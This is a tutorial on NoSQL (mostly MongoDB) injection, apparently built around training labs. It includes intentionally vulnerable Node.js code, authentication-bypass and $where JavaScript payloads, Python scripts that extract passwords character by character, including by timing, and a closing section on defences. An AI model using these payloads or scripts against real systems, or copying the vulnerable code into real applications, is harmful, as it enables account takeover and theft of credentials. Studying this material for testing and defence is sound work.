# NoSQL Injection - Comprehensive Guide

NoSQL injection is a web security vulnerability that allows attackers to interfere with database queries in NoSQL databases by manipulating user input. Unlike traditional SQL injection which targets relational databases using SQL syntax, NoSQL injection exploits the diverse query languages, operators, and data structures used by non-relational databases like MongoDB, CouchDB, Redis, and Cassandra. Attackers can exploit NoSQL injection to bypass authentication mechanisms, extract sensitive data character-by-character, modify database records, cause denial-of-service conditions, and in some cases achieve remote code execution through JavaScript evaluation in operators like MongoDB's $where. The lack of a universal query standard and the semi-structured nature of NoSQL data creates unique exploitation opportunities distinct from traditional SQL injection.

The fundamental difference: **NoSQL databases use varied query languages and operators instead of SQL**—each requires adapted injection techniques.

## What is NoSQL injection?

### NoSQL vs. SQL databases

**Traditional SQL (relational):**
```sql
-- Structured tables with fixed schema
CREATE TABLE users (
    id INT PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(100),
    email VARCHAR(100)
);

-- Standard SQL query language
SELECT * FROM users WHERE username = 'admin' AND password = 'pass123';
```

**NoSQL (non-relational):**
```javascript
// MongoDB - Document-based (JSON-like)
{
    "_id": ObjectId("507f1f77bcf86cd799439011"),
    "username": "admin",
    "password": "pass123",
    "email": "admin@example.com",
    "roles": ["admin", "user"],
    "metadata": { "lastLogin": "2026-02-18" }
}

// MongoDB query
db.users.find({ username: "admin", password: "pass123" });
```

**Key differences:**

| Feature | SQL | NoSQL |
|---------|-----|-------|
| Schema | Fixed, predefined | Dynamic, flexible |
| Query Language | SQL (universal) | Database-specific (MongoDB, CouchDB, etc.) |
| Data Structure | Tables, rows, columns | Documents, key-value, graphs, etc. |
| Relationships | Joins, foreign keys | Embedded documents, references |
| Injection Type | SQL syntax | Operators, JavaScript, query structure |

### NoSQL database types

**Document stores (MongoDB, CouchDB):**
```javascript
// Store JSON-like documents
{
    "product": "Laptop",
    "price": 999,
    "specs": { "ram": "16GB", "cpu": "i7" }
}
```

**Key-value stores (Redis, DynamoDB):**
```
user:1001 → { "name": "John", "age": 30 }
session:abc123 → { "userId": 1001, "expires": 1234567890 }
```

**Column-family stores (Cassandra, HBase):**
```
Row key: user123
Column family: profile
  - name: "Alice"
  - email: "alice@example.com"
```

**Graph databases (Neo4j, ArangoDB):**
```
(Person:Alice)-[:FRIENDS_WITH]->(Person:Bob)
```

### Impact of NoSQL injection

**Critical - Authentication bypass:**
```javascript
// Original query
db.users.find({ username: "user", password: "pass" });

// Injected query
db.users.find({ username: {"$ne": null}, password: {"$ne": null} });
// Returns first user (often admin)
```

**High - Data extraction:**
```javascript
// Character-by-character password extraction
db.users.find({ 
    username: "admin",
    $where: "this.password[0] == 'a'"
});
```

**High - Data modification:**
```javascript
// Injecting update operators
db.users.update(
    { username: "victim" },
    { $set: { role: "admin" } }
);
```

**Medium - Denial of Service:**
```javascript
// Expensive regex causing CPU exhaustion
db.products.find({ 
    name: { $regex: "(a+)+b" }  // Catastrophic backtracking
});
```

**Medium - Code execution (MongoDB):**
```javascript
// JavaScript evaluation via $where
db.users.find({
    $where: "function() { /* arbitrary JavaScript */ }"
});
```

## Types of NoSQL injection

### Type 1: Syntax injection

**Concept:** Break NoSQL query syntax to inject malicious logic, similar to SQL injection.

**Vulnerable code (Node.js with MongoDB):**
```javascript
app.get('/products', function(req, res) {
    var category = req.query.category;
    
    // Vulnerable: Direct concatenation
    var query = "this.category == '" + category + "'";
    
    db.collection('products').find({ $where: query }).toArray(function(err, docs) {
        res.json(docs);
    });
});
```

**Normal request:**
```
GET /products?category=electronics HTTP/1.1
```

**Query executed:**
```javascript
this.category == 'electronics'
```

**Injection attack:**
```
GET /products?category=electronics' || '1'=='1 HTTP/1.1
```

**Query executed:**
```javascript
this.category == 'electronics' || '1'=='1'
// Always true - returns all products
```

### Type 2: Operator injection

**Concept:** Inject NoSQL query operators to manipulate query logic.

**Vulnerable code:**
```javascript
app.post('/login', function(req, res) {
    var username = req.body.username;
    var password = req.body.password;
    
    // Vulnerable: No input validation
    db.collection('users').findOne({
        username: username,
        password: password
    }, function(err, user) {
        if (user) {
            res.send("Login successful");
        } else {
            res.send("Login failed");
        }
    });
});
```

**Normal request:**
```json
POST /login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"secretpass"}
```

**Query executed:**
```javascript
db.users.findOne({ username: "admin", password: "secretpass" });
```

**Operator injection attack:**
```json
POST /login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":{"$ne":"invalid"}}
```

**Query executed:**
```javascript
db.users.findOne({ 
    username: "admin", 
    password: { $ne: "invalid" }  // Not equal to "invalid"
});
// Matches admin user without knowing password!
```

## Detecting NoSQL injection (syntax injection)

### Technique 1: Fuzz string injection

**MongoDB fuzz string:**
```
'"`{
;$Foo}
$Foo \xYZ
```

**Purpose:** Trigger syntax errors or unexpected behavior.

**Test URL:**
```
GET /product/lookup?category=fizzy HTTP/1.1
```

**Normal response:**
```json
[
    {"name": "Cola", "price": 1.99},
    {"name": "Sprite", "price": 1.99}
]
```

**Inject fuzz string:**
```
GET /product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00 HTTP/1.1
```

**URL decoded:**
```
'"`{
;$Foo}
$Foo \xYZ
```

**Vulnerable response (error):**
```json
{
    "error": "SyntaxError: Unexpected token",
    "query": "this.category == ''\"...'"
}
```

**or changed behavior:**
```json
[]
```

**Empty results indicate parsing error—potential injection point!**

### Technique 2: Special character testing

**Test individual characters:**

**Single quote injection:**
```
GET /product/lookup?category=fizzy' HTTP/1.1
```

**Query executed:**
```javascript
this.category == 'fizzy''
// Syntax error: unterminated string
```

**Error response:**
```
MongoDB error: Unexpected end of input
```

**Confirms input processed in query syntax.**

**Escaped quote (valid syntax):**
```
GET /product/lookup?category=fizzy\' HTTP/1.1
```

**Query executed:**
```javascript
this.category == 'fizzy\''
// Valid syntax
```

**Normal response returned—confirms vulnerability!**

**Other test characters:**
```
Test: fizzy"      → Error if double quotes used
Test: fizzy$      → Error if $ interpreted as operator
Test: fizzy;      → Error if ; terminates statement
Test: fizzy{      → Error if { starts object
Test: fizzy\x00   → Null byte - may truncate query
```

### Technique 3: Conditional testing

**Test false condition:**
```
GET /product/lookup?category=fizzy' && 0 && 'x HTTP/1.1
```

**Query executed:**
```javascript
this.category == 'fizzy' && 0 && 'x'
// Evaluates to false (0 is falsy)
```

**Expected result:** No products returned (false condition filters everything).

**Test true condition:**
```
GET /product/lookup?category=fizzy' && 1 && 'x HTTP/1.1
```

**Query executed:**
```javascript
this.category == 'fizzy' && 1 && 'x'
// Evaluates to true for fizzy products
```

**Expected result:** Fizzy products returned.

**If responses differ, injection confirmed!**

### Technique 4: Always-true condition

**Override existing conditions:**
```
GET /product/lookup?category=fizzy'||'1'=='1 HTTP/1.1
```

**URL encoded:**
```
GET /product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31 HTTP/1.1
```

**Query executed:**
```javascript
this.category == 'fizzy' || '1'=='1'
// Always true
```

**Result:** All products returned (bypassed category filter)!

**Alternative always-true payloads:**
```javascript
' || 1==1 //
' || 'a'=='a
' || true || '
```

#### Lab: Detecting NoSQL injection

**Scenario:** Product lookup by category.

**Step 1: Normal request**
```
GET /product/lookup?category=Gifts HTTP/1.1
```

**Response:** 3 products in Gifts category.

**Step 2: Test with single quote**
```
GET /product/lookup?category=Gifts' HTTP/1.1
```

**Response:** 500 Internal Server Error

**Step 3: Test escaped quote**
```
GET /product/lookup?category=Gifts\' HTTP/1.1
```

**Response:** 200 OK, 3 products

**Vulnerability confirmed!**

**Step 4: Inject always-true condition**
```
GET /product/lookup?category=Gifts'||'1'=='1 HTTP/1.1
```

**Response:** 200 OK, 20 products (all categories)

**Successfully bypassed category filter!**

### Technique 5: Null byte injection

**Purpose:** Truncate query to remove additional conditions.

**Vulnerable query with multiple conditions:**
```javascript
this.category == 'fizzy' && this.released == 1
```

**Normal behavior:** Only shows released products.

**Null byte injection:**
```
GET /product/lookup?category=fizzy'%00 HTTP/1.1
```

**Query executed:**
```javascript
this.category == 'fizzy'\x00' && this.released == 1
```

**If MongoDB ignores characters after null byte:**
```javascript
this.category == 'fizzy'
// this.released condition ignored
```

**Result:** Shows unreleased products in fizzy category!

## Detecting NoSQL operator injection

### Common MongoDB operators

**Comparison operators:**
```javascript
$eq   // Equal to
$ne   // Not equal to
$gt   // Greater than
$gte  // Greater than or equal
$lt   // Less than
$lte  // Less than or equal
$in   // Matches any value in array
$nin  // Matches none of values in array
```

**Logical operators:**
```javascript
$and  // Logical AND
$or   // Logical OR
$not  // Logical NOT
$nor  // Logical NOR
```

**Element operators:**
```javascript
$exists  // Field exists
$type    // Field is of specific type
```

**Evaluation operators:**
```javascript
$where   // JavaScript expression evaluation
$regex   // Regular expression matching
$expr    // Aggregation expressions
```

**Array operators:**
```javascript
$all      // Array contains all specified elements
$elemMatch // Array contains element matching conditions
$size     // Array has specific size
```

### Testing for operator injection

**Vulnerable authentication (Node.js):**
```javascript
app.post('/login', function(req, res) {
    db.users.findOne({
        username: req.body.username,
        password: req.body.password
    }, function(err, user) {
        if (user) {
            req.session.userId = user._id;
            res.redirect('/dashboard');
        } else {
            res.send('Invalid credentials');
        }
    });
});
```

**Normal login:**
```json
POST /login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"secretpass"}
```

**Test $ne operator:**
```json
POST /login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":{"$ne":"invalid"}}
```

**Query executed:**
```javascript
db.users.findOne({
    username: "admin",
    password: { $ne: "invalid" }  // password != "invalid"
});
```

**Result:** Returns admin user (password is NOT "invalid" → true)

**Login successful without knowing password!**

### Authentication bypass techniques

**Technique 1: $ne (not equal) bypass**
```json
{
    "username": "admin",
    "password": {"$ne": ""}
}
```

**Logic:** Find user where password is not empty string (almost always true).

**Technique 2: Both fields with $ne**
```json
{
    "username": {"$ne": "invalid"},
    "password": {"$ne": "invalid"}
}
```

**Logic:** Find any user where both username and password are not "invalid" → returns first user.

**Technique 3: $in operator with username guessing**
```json
{
    "username": {"$in": ["admin", "administrator", "root", "superuser"]},
    "password": {"$ne": ""}
}
```

**Logic:** Match common admin usernames, bypass password.

**Technique 4: $gt (greater than) bypass**
```json
{
    "username": "admin",
    "password": {"$gt": ""}
}
```

**Logic:** Password greater than empty string (lexicographically) → true for most passwords.

**Technique 5: $regex (regular expression) bypass**
```json
{
    "username": "admin",
    "password": {"$regex": ".*"}
}
```

**Logic:** Password matches any characters → always true.

#### Lab: Exploiting NoSQL operator injection to bypass authentication

**Scenario:** Login form vulnerable to operator injection.

**Step 1: Normal login attempt**
```json
POST /login HTTP/1.1
Content-Type: application/json

{"username":"wiener","password":"peter"}
```

**Response:** Login successful (known credentials)

**Step 2: Test operator injection on password**
```json
POST /login HTTP/1.1
Content-Type: application/json

{"username":"wiener","password":{"$ne":"invalid"}}
```

**Response:** Login successful!

**Step 3: Target admin account**
```json
POST /login HTTP/1.1
Content-Type: application/json

{"username":"administrator","password":{"$ne":""}}
```

**Response:** Logged in as administrator!

**Step 4: Solve lab**
```
Access /admin panel
Delete user carlos
Lab solved
```

### URL-based operator injection

**GET request vulnerable to operators:**
```
GET /search?username=admin HTTP/1.1
```

**Convert to operator injection:**
```
GET /search?username[$ne]=invalid HTTP/1.1
```

**Parsed as:**
```javascript
{ username: { $ne: "invalid" } }
```

**If application uses query parser (e.g., Express with default parser):**
```javascript
req.query.username = { $ne: "invalid" }
```

**Directly injected into MongoDB query!**

**Testing methodology:**

**Step 1: Normal request**
```
GET /user/profile?username=john HTTP/1.1
```

**Step 2: Inject operator via URL**
```
GET /user/profile?username[$ne]=invalid HTTP/1.1
```

**Step 3: Observe response changes**
```
If different → Operator injection possible
```

**Alternative URL injection formats:**
```
username[$ne]=invalid
username[$gt]=
username[$regex]=.*
username[$in][]=admin&username[$in][]=root
```

## Exploiting NoSQL injection to extract data

### JavaScript injection via $where operator

**Vulnerable query using $where:**
```javascript
app.get('/user/lookup', function(req, res) {
    var username = req.query.username;
    
    db.users.findOne({
        $where: "this.username == '" + username + "'"
    }, function(err, user) {
        res.json({ role: user.role });
    });
});
```

**Normal request:**
```
GET /user/lookup?username=admin HTTP/1.1
```

**Query:**
```javascript
{ $where: "this.username == 'admin'" }
```

**JavaScript injection attack:**
```
GET /user/lookup?username=admin' && this.password[0] == 'a' || 'a'=='b HTTP/1.1
```

**Query:**
```javascript
{ $where: "this.username == 'admin' && this.password[0] == 'a' || 'a'=='b'" }
```

**Logic:**
```
If password starts with 'a': true && true || false = true → User found
If password doesn't start with 'a': true && false || false = false → User not found
```

**Response differences reveal password characters!**

### Character-by-character password extraction

**Automated extraction process:**

**Step 1: Test first character**
```
Payload: admin' && this.password[0] == 'a' || 'a'=='b
Response: User found
→ First character is 'a'

Payload: admin' && this.password[0] == 'b' || 'a'=='b
Response: User not found
→ First character is not 'b'
```

**Step 2: Test second character**
```
Payload: admin' && this.password[1] == 'a' || 'a'=='b
Response: User not found

Payload: admin' && this.password[1] == 'b' || 'a'=='b
Response: User found
→ Second character is 'b'
```

**Step 3: Continue until complete**
```
Password extracted: abc123...
```

**Burp Intruder automation:**

**Configure Intruder:**
```
GET /user/lookup?username=admin' && this.password[§0§] == '§a§' || 'a'=='b HTTP/1.1

Position 1: 0-20 (password index)
Position 2: a-z, A-Z, 0-9 (character to test)
```

**Grep - Match:**
```
Add: "role": "admin"
```

**Filter results where match occurs → reveals characters at each position.**

#### Lab: Exploiting NoSQL injection to extract data

**Scenario:** User lookup that uses $where operator.

**Step 1: Identify vulnerability**
```
GET /user/lookup?username=administrator HTTP/1.1
```

**Response:**
```json
{"role": "admin"}
```

**Step 2: Test JavaScript injection**
```
GET /user/lookup?username=administrator' && '1'=='1 HTTP/1.1
```

**Response:**
```json
{"role": "admin"}
```

**Step 3: Test false condition**
```
GET /user/lookup?username=administrator' && '1'=='2 HTTP/1.1
```

**Response:**
```json
{}
```

**Conditional behavior confirmed!**

**Step 4: Extract password character-by-character**
```
username=administrator' && this.password[0] == 'a' || 'a'=='b
→ Empty response (not 'a')

username=administrator' && this.password[0] == 'b' || 'a'=='b
→ Empty response (not 'b')
...
username=administrator' && this.password[0] == 'p' || 'a'=='b
→ User found! First character is 'p'
```

**Step 5: Automate extraction**

**Using Burp Intruder or custom script:**
```python
import requests
import string

url = "https://target.com/user/lookup"
password = ""

for i in range(20):  # Assume max 20 chars
    for char in string.ascii_lowercase + string.digits:
        payload = f"administrator' && this.password[{i}] == '{char}' || 'a'=='b"
        r = requests.get(url, params={"username": payload})
        
        if '"role"' in r.text:
            password += char
            print(f"Password so far: {password}")
            break
    else:
        break  # No more characters

print(f"Final password: {password}")
```

**Step 6: Login with extracted password**
```
Password: p4ssw0rd123
Login successful!
```

### Extracting data using match() function

**JavaScript match() for pattern detection:**

**Test if password contains digits:**
```
GET /user/lookup?username=admin' && this.password.match(/\d/) || 'a'=='b HTTP/1.1
```

**Logic:**
```
this.password.match(/\d/)  → Returns match if password contains digit
If match: true || false = true
If no match: null || false = false
```

**Test if password contains special characters:**
```
username=admin' && this.password.match(/[!@#$%]/) || 'a'=='b
```

**Test password length:**
```
username=admin' && this.password.length == 8 || 'a'=='b
```

**Reveals password characteristics before full extraction.**

### Identifying field names

**Problem:** Don't know what fields exist in user document.

**Technique 1: Field existence testing**

**Test if 'password' field exists:**
```
GET /user/lookup?username=admin' && this.password!=' HTTP/1.1
```

**If field exists:** Normal response (password is not empty string)
**If field doesn't exist:** Error or different response

**Test known field (baseline):**
```
username=admin' && this.username!='
```

**Response:** User found (username field exists)

**Test unknown field:**
```
username=admin' && this.foo!='
```

**Response:** Empty or error (foo field doesn't exist)

**Compare responses to identify valid fields.**

**Technique 2: Dictionary attack on field names**

**Common field name wordlist:**
```
password
passwd
pwd
pass
secret
token
apiKey
api_key
sessionId
session_id
email
phone
ssn
creditCard
```

**Burp Intruder:**
```
username=admin' && this.§password§!='

Payload: Field name wordlist
Compare responses to identify valid fields
```

## Exploiting operator injection to extract data

### Injecting $where operator

**Vulnerable endpoint that doesn't use $where:**
```javascript
db.users.findOne({
    username: req.body.username,
    password: req.body.password
});
```

**Inject $where as additional parameter:**
```json
POST /login HTTP/1.1
Content-Type: application/json

{
    "username": "admin",
    "password": "peter",
    "$where": "1"
}
```

**Query executed:**
```javascript
db.users.findOne({
    username: "admin",
    password: "peter",
    $where: "1"
});
```

**If $where processed:**
- `$where: "1"` (true) → User found
- `$where: "0"` (false) → User not found

**Test both:**
```json
{"username": "admin", "password": "peter", "$where": "0"}
→ Login fails

{"username": "admin", "password": "peter", "$where": "1"}
→ Login succeeds
```

**If responses differ → Can inject JavaScript!**

### Extracting field names with keys()

**JavaScript Object.keys() method:**

**Payload:**
```json
{
    "username": "admin",
    "password": {"$ne": ""},
    "$where": "Object.keys(this)[0].match('^.{0}a.*')"
}
```

**Breakdown:**
```javascript
Object.keys(this)       // Returns array of field names: ["_id", "username", "password", ...]
[0]                     // First field name
.match('^.{0}a.*')      // Regex: starts with 'a' at position 0
```

**Testing first character of first field:**
```
$where: "Object.keys(this)[0].match('^.{0}a.*')"
→ If first field starts with 'a': Match (true)
→ Otherwise: No match (false)
```

**Extract field name character-by-character:**
```javascript
// Position 0, character 'a'
Object.keys(this)[0].match('^.{0}a.*')

// Position 1, character 'b'
Object.keys(this)[0].match('^.{1}b.*')

// Result: First field name starts with "ab..."
```

#### Lab: Exploiting NoSQL operator injection to extract unknown fields

**Scenario:** Authentication vulnerable to operator injection, need to find password reset token field name.

**Step 1: Bypass authentication**
```json
POST /login HTTP/1.1

{"username":"wiener","password":{"$ne":""}}
```

**Step 2: Inject $where operator**
```json
{
    "username": "wiener",
    "password": {"$ne": ""},
    "$where": "1"
}
```

**Response:** Login successful ($ where processed)

**Step 3: Extract field names with Object.keys()**
```json
{
    "username": "carlos",
    "password": {"$ne": ""},
    "$where": "Object.keys(this)[2].match('^.{0}a.*')"
}
```

**Test all positions and characters:**

**Burp Intruder positions:**
```json
{
    "username": "carlos",
    "password": {"$ne": ""},
    "$where": "Object.keys(this)[§2§].match('^.{§0§}§a§.*')"
}
```

**Payload sets:**
- Position 1: 0-10 (field index)
- Position 2: 0-20 (character position)
- Position 3: a-z, 0-9 (character to test)

**Results show:**
```
Field index 2, position 0-8: "resetToken"
```

**Step 4: Extract token value**
```json
{
    "username": "carlos",
    "password": {"$ne": ""},
    "$where": "this.resetToken[§0§] == '§a§'"
}
```

**Extract character-by-character:**
```
Token: abc123xyz789...
```

**Step 5: Use token to reset password**
```
GET /forgot-password?token=abc123xyz789...
Reset carlos's password
Login as carlos
Lab solved
```

### Using $regex operator for extraction

**$regex operator (doesn't require JavaScript):**

**Extract password character-by-character:**
```json
POST /login HTTP/1.1

{"username":"admin","password":{"$regex":"^a.*"}}
```

**Query:**
```javascript
db.users.findOne({
    username: "admin",
    password: { $regex: "^a.*" }  // Starts with 'a'
});
```

**If password starts with 'a':** User found
**Otherwise:** User not found

**Automated extraction:**

**Position 0:**
```json
{"username":"admin","password":{"$regex":"^a"}}  → Found
→ First character is 'a'
```

**Position 1:**
```json
{"username":"admin","password":{"$regex":"^ab"}}  → Not found
{"username":"admin","password":{"$regex":"^ad"}}  → Found
→ Second character is 'd'
```

**Continue:**
```
Password extracted: admin123
```

**Burp Intruder configuration:**
```json
{
    "username": "admin",
    "password": {"$regex": "^§a§"}
}

Payload type: Cluster bomb
Position 1: Extracted characters + test character
Example: a, ab, abc, abcd (cumulative)
```

**Python script:**
```python
import requests
import string

url = "https://target.com/login"
password = ""
chars = string.ascii_lowercase + string.digits + string.punctuation

while True:
    found = False
    for char in chars:
        test_password = password + char
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{test_password}"}
        }
        
        r = requests.post(url, json=payload)
        
        if "success" in r.text.lower():
            password += char
            print(f"Password: {password}")
            found = True
            break
    
    if not found:
        break

print(f"Final password: {password}")
```

## Timing-based NoSQL injection

### The technique

**Scenario:** No visible response differences (blind injection).

**Solution:** Use time delays to infer true/false conditions.

**MongoDB sleep function:**
```javascript
sleep(milliseconds)
```

**Conditional time delay:**
```javascript
if (condition) { sleep(5000); }
```

### Timing-based password extraction

**Payload structure:**
```
username=admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```

**Breakdown:**
```javascript
function(x) {
    if (x.password[0] === "a") {
        sleep(5000);  // 5 second delay
    }
}(this)  // Execute immediately with 'this' (current document)
```

**Testing:**

**Test character 'a' at position 0:**
```
Payload: admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
Response time: 5.2 seconds
→ First character is 'a'
```

**Test character 'b' at position 0:**
```
Payload: admin'+function(x){if(x.password[0]==="b"){sleep(5000)};}(this)+'
Response time: 0.1 seconds
→ First character is not 'b'
```

**Alternative payload with while loop:**
```javascript
admin'+function(x){
    var waitTill = new Date(new Date().getTime() + 5000);
    while((x.password[0]==="a") && waitTill > new Date()){}
}(this)+'
```

**Busy-wait loop causes 5-second delay if condition true.**

### Automated timing-based extraction

**Python script:**
```python
import requests
import time
import string

url = "https://target.com/user/lookup"
password = ""

for i in range(20):
    for char in string.ascii_lowercase + string.digits:
        payload = f"admin'+function(x){{if(x.password[{i}]==='{char}'){{sleep(3000)}}}}(this)+'"
        
        start = time.time()
        r = requests.get(url, params={"username": payload})
        elapsed = time.time() - start
        
        if elapsed > 2.5:  # Allow some margin
            password += char
            print(f"Password: {password}")
            break
    else:
        break

print(f"Final password: {password}")
```

**Considerations:**
- Set reasonable timeout (e.g., 10 seconds)
- Account for network latency
- Multiple requests to establish baseline
- Use moderate delay (3-5 seconds) to avoid overwhelming server

## Prevention strategies

### Defense Layer 1: Input validation and sanitization

**Whitelist allowed characters:**
```javascript
function sanitizeUsername(username) {
    // Allow only alphanumeric and underscore
    const whitelist = /^[a-zA-Z0-9_]+$/;
    
    if (!whitelist.test(username)) {
        throw new Error("Invalid username format");
    }
    
    return username;
}

app.post('/login', function(req, res) {
    try {
        const username = sanitizeUsername(req.body.username);
        // Safe to use in query
    } catch (err) {
        res.status(400).send("Invalid input");
    }
});
```

**Validate data types:**
```javascript
function validateLoginInput(data) {
    // Ensure username and password are strings
    if (typeof data.username !== 'string' || typeof data.password !== 'string') {
        throw new Error("Invalid input type");
    }
    
    // Reject objects (prevents operator injection)
    if (typeof data.username === 'object' || typeof data.password === 'object') {
        throw new Error("Invalid input type");
    }
    
    return true;
}

app.post('/login', function(req, res) {
    try {
        validateLoginInput(req.body);
        // Proceed with query
    } catch (err) {
        res.status(400).send("Invalid input");
    }
});
```

### Defense Layer 2: Use parameterized queries / safe APIs

**Unsafe (vulnerable):**
```javascript
// Direct concatenation
db.users.findOne({
    $where: "this.username == '" + username + "'"
});
```

**Safe (parameterized):**
```javascript
// Use query object (no concatenation)
db.users.findOne({
    username: username,
    password: password
});
```

**Even safer (hash passwords, compare hashes):**
```javascript
const bcrypt = require('bcrypt');

// During registration
const hashedPassword = await bcrypt.hash(password, 10);
db.users.insertOne({ username, password: hashedPassword });

// During login
const user = await db.users.findOne({ username });
if (user && await bcrypt.compare(password, user.password)) {
    // Login successful
}
```

### Defense Layer 3: Disable dangerous operators

**Restrict $where operator:**
```javascript
// MongoDB configuration
mongod --noscripting
```

**Or in code:**
```javascript
function sanitizeQuery(query) {
    // Recursively check for dangerous operators
    if (typeof query === 'object') {
        for (let key in query) {
            if (key === '$where' || key === 'mapReduce') {
                throw new Error("Operator not allowed");
            }
            
            if (typeof query[key] === 'object') {
                sanitizeQuery(query[key]);
            }
        }
    }
    
    return query;
}

app.post('/login', function(req, res) {
    try {
        sanitizeQuery(req.body);
        // Proceed with query
    } catch (err) {
        res.status(400).send("Invalid query");
    }
});
```

### Defense Layer 4: Operator allowlist

**Allow only specific operators:**
```javascript
const ALLOWED_OPERATORS = ['$eq', '$ne', '$gt', '$gte', '$lt', '$lte'];

function validateOperators(query) {
    if (typeof query === 'object') {
        for (let key in query) {
            if (key.startsWith('$') && !ALLOWED_OPERATORS.includes(key)) {
                throw new Error(`Operator ${key} not allowed`);
            }
            
            if (typeof query[key] === 'object') {
                validateOperators(query[key]);
            }
        }
    }
    
    return true;
}
```

### Defense Layer 5: Use ORM/ODM with built-in protections

**Mongoose (MongoDB ODM) with schema validation:**
```javascript
const mongoose = require('mongoose');

// Define schema
const userSchema = new mongoose.Schema({
    username: { 
        type: String, 
        required: true,
        match: /^[a-zA-Z0-9_]+$/  // Whitelist pattern
    },
    password: { 
        type: String, 
        required: true 
    },
    role: {
        type: String,
        enum: ['user', 'admin'],  // Restrict values
        default: 'user'
    }
});

const User = mongoose.model('User', userSchema);

// Safe query
app.post('/login', async function(req, res) {
    try {
        // Mongoose validates types
        const user = await User.findOne({
            username: req.body.username,
            password: req.body.password
        });
        
        if (user) {
            res.send("Login successful");
        } else {
            res.status(401).send("Invalid credentials");
        }
    } catch (err) {
        res.status(400).send("Invalid input");
    }
});
```

### Defense Layer 6: Principle of least privilege

**Database user permissions:**
```javascript
// Create limited user
db.createUser({
    user: "appUser",
    pwd: "securePassword",
    roles: [
        {
            role: "readWrite",
            db: "appDatabase"
        }
    ]
});

// Deny code execution capabilities
// Remove roles that allow $where, mapReduce
```

### Complete secure implementation

**Node.js with Express and MongoDB:**
```javascript
const express = require('express');
const mongoose = require('mongoose');
const bcrypt = require('bcrypt');
const validator = require('validator');

const app = express();
app.use(express.json());

// Define secure schema
const userSchema = new mongoose.Schema({
    username: {
        type: String,
        required: true,
        unique: true,
        minlength: 3,
        maxlength: 20,
        validate: {
            validator: function(v) {
                return /^[a-zA-Z0-9_]+$/.test(v);
            },
            message: 'Username must contain only alphanumeric characters and underscores'
        }
    },
    password: {
        type: String,
        required: true
    },
    role: {
        type: String,
        enum: ['user', 'admin'],
        default: 'user'
    }
});

const User = mongoose.model('User', userSchema);

// Input validation middleware
function validateInput(req, res, next) {
    const { username, password } = req.body;
    
    // Type check
    if (typeof username !== 'string' || typeof password !== 'string') {
        return res.status(400).json({ error: 'Invalid input type' });
    }
    
    // Sanitize
    if (!validator.isAlphanumeric(username, 'en-US', { ignore: '_' })) {
        return res.status(400).json({ error: 'Invalid username format' });
    }
    
    // Length check
    if (username.length < 3 || username.length > 20) {
        return res.status(400).json({ error: 'Username must be 3-20 characters' });
    }
    
    if (password.length < 8) {
        return res.status(400).json({ error: 'Password must be at least 8 characters' });
    }
    
    next();
}

// Secure registration
app.post('/register', validateInput, async (req, res) => {
    try {
        const { username, password } = req.body;
        
        // Hash password
        const hashedPassword = await bcrypt.hash(password, 10);
        
        // Create user
        const user = new User({
            username,
            password: hashedPassword
        });
        
        await user.save();
        
        res.json({ message: 'Registration successful' });
    } catch (err) {
        if (err.code === 11000) {
            res.status(400).json({ error: 'Username already exists' });
        } else {
            res.status(500).json({ error: 'Server error' });
        }
    }
});

// Secure login
app.post('/login', validateInput, async (req, res) => {
    try {
        const { username, password } = req.body;
        
        // Find user (parameterized query)
        const user = await User.findOne({ username });
        
        if (!user) {
            return res.status(401).json({ error: 'Invalid credentials' });
        }
        
        // Compare hashed passwords
        const isValid = await bcrypt.compare(password, user.password);
        
        if (isValid) {
            req.session.userId = user._id;
            res.json({ message: 'Login successful' });
        } else {
            res.status(401).json({ error: 'Invalid credentials' });
        }
    } catch (err) {
        res.status(500).json({ error: 'Server error' });
    }
});

// Connect to MongoDB with secure options
mongoose.connect('mongodb://localhost:27017/secureApp', {
    useNewUrlParser: true,
    useUnifiedTopology: true
});

app.listen(3000);
```
